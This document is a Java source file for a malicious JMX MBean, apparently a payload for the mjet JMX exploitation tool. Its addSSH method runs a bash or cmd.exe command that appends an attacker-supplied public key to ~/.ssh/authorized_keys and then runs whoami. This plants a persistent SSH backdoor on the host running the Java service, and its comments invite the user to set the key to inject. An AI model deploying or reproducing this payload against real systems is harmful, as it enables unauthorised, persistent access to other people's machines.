import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class AddSSH implements AddSSHMBean {

	//Set this to whatever pubkey you wish to inject
	private final String SSH_PUB_KEY = null;

	public String addSSH() {
		if (SSH_PUB_KEY == null) {
			return "You should call with -method addSSH -params YourSSHKeyHere. You can also modify the Mbean and set the 'SSH_PUB_KEY' variable.";
		}

		return addSSH(SSH_PUB_KEY);
	}

	public String addSSH(String sshKey) {
		try {
			String[] fullCommand;
			String command = "echo " + "'" + sshKey + "'" + " >>~/.ssh/authorized_keys && whoami";

			//https://github.com/mogwailabs/mjet, OS specific execution
			if (System.getProperty("line.separator").equals("\n"))
				fullCommand = new String[]{"bash", "-c", command};
			else
				fullCommand = new String[]{"cmd.exe", "/c", command};

			Runtime runtime = Runtime.getRuntime();
			Process p = runtime.exec(fullCommand);

			p.waitFor();
			InputStream is = p.getInputStream();
			BufferedReader reader = new java.io.BufferedReader(new InputStreamReader(is));

			java.lang.StringBuilder builder = new StringBuilder();
			String line = null;
			while ((line = reader.readLine()) != null) {
				builder.append(line);
				builder.append(System.getProperty("line.separator"));
			}
			String result = builder.toString();

			is.close();
			return result;
		} catch (IOException e) {
			return e.toString();
		} catch (InterruptedException e) {
			return e.toString();
		}
	}
}
